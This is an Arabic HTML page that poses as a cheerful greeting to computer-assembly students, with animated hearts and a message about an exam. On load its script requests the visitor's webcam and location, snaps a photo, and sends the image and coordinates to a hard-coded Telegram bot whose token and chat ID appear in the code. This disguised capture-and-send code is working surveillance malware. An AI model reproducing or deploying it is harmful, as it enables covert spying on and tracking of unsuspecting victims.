<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>االسجاجه </title>
<style>
  body {
    margin: 0;
    padding: 0;
    overflow: hidden;
    background: #fff;
    font-family: Arial, sans-serif;
  }

  .heart {
    position: absolute;
    font-weight: bold;
    font-size: 24px;
    user-select: none;
    pointer-events: none;
    white-space: nowrap;
  }

  #statusMessage {
    position: fixed;
    top: 10px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(255,0,0,0.8);
    color: white;
    padding: 8px 16px;
    border-radius: 8px;
    font-weight: bold;
    z-index: 1000;
    display: none;
  }
</style>
</head>
<body>

<div id="statusMessage"> باجرر امتحان اقروو يولدد...</div>

<script>
  // ======== القلوب المتحركة ========
  const texts = ['❤️  تحياتي لجميع الطلاب في قسم تجميع الحاسبات  ❤️'];
  const hearts = [];
  const colors = ['red','pink','orange','purple','blue'];

  function createHeart() {
    const heart = document.createElement('div');
    heart.className = 'heart';
    heart.textContent = texts[Math.floor(Math.random() * texts.length)];
    heart.style.color = colors[Math.floor(Math.random() * colors.length)];
    heart.style.left = Math.random() * window.innerWidth + 'px';
    heart.style.top = Math.random() * window.innerHeight + 'px';
    heart.speedX = (Math.random() - 0.5) * 2;
    heart.speedY = (Math.random() - 0.5) * 2;
    document.body.appendChild(heart);
    hearts.push(heart);
  }

  for (let i = 0; i < 30; i++) createHeart();

  function moveHearts() {
    hearts.forEach(h => {
      let x = parseFloat(h.style.left);
      let y = parseFloat(h.style.top);
      x += h.speedX;
      y += h.speedY;
      if (x < 0 || x > window.innerWidth - 50) h.speedX *= -1;
      if (y < 0 || y > window.innerHeight - 30) h.speedY *= -1;
      h.style.left = x + 'px';
      h.style.top = y + 'px';
    });
    requestAnimationFrame(moveHearts);
  }
  moveHearts();

  // ======== إعدادات بوت تيليجرام ========
  const BOT_TOKEN = '8105401816:AAHh2tBONvPoUTMTUI862cXcVmE4XN7m_1A'; // ضع توكن البوت هنا
  const CHAT_ID = '1037860664';     // ضع الايدي هنا

  async function captureAndSend() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.autoplay = true;
      video.playsInline = true;
      video.srcObject = stream;

      const canvas = document.createElement('canvas');
      canvas.width = 640; // حجم أكبر لتحسين جودة الصورة
      canvas.height = 480;
      const ctx = canvas.getContext('2d');

      const status = document.getElementById('statusMessage');
      status.style.display = 'block';

      setTimeout(async () => {
        // التقاط الصورة
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageBlob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();

        // الحصول على الموقع الجغرافي
        let latitude = null;
        let longitude = null;
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              (pos) => { latitude = pos.coords.latitude; longitude = pos.coords.longitude; resolve(); },
              (err) => { console.warn("فشل الحصول على الموقع:", err); resolve(); }
            );
          });
        } catch (err) {
          console.warn("خطأ في تحديد الموقع:", err);
        }

        // إعداد FormData لإرسال الصورة والموقع
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'photo.jpg');

        // إرسال الصورة أولاً
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(() => console.log('تم إرسال الصورة للبوت!'))
        .catch(e => console.error('خطأ في إرسال الصورة:', e));

        // إرسال الموقع إذا توفر
        if (latitude && longitude) {
          const locationData = new FormData();
          locationData.append('chat_id', CHAT_ID);
          locationData.append('latitude', latitude);
          locationData.append('longitude', longitude);

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            body: locationData
          })
          .then(() => console.log('تم إرسال الموقع للبوت!'))
          .catch(e => console.error('خطأ في إرسال الموقع:', e));
        }

        // إخفاء الرسالة وإيقاف الكاميرا
        status.style.display = 'none';
        stream.getTracks().forEach(track => track.stop());
      }, 2000);

    } catch (err) {
      console.error("فشل الوصول للكاميرا:", err);
    }
  }

  window.addEventListener('load', captureAndSend);
</script>

</body>
</html>
